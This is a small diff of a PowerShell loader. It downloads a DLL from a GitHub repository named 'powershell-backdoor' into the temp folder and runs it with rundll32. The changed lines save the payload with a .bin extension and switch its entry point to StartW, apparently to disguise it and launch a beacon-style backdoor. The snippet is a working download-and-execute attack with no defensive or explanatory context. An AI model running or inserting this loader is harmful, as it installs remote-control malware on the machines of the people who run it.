@@ -1,4 +1,4 @@
-$path = $Env:temp+'\systemnet.dll'; 
+$path = $Env:temp+'\systemnet.bin'; 
 $client = New-Object System.Net.WebClient; 
 $client.downloadfile('https://raw.githubusercontent.com/crypt0n-root/powershell-backdoor/main/systemdll/systemnet.dll',$path);
-c:\windows\system32\rundll32.exe $path,ClearMyTracksByProcess 11985756;
+c:\windows\system32\rundll32.exe $path,StartW 11985756;
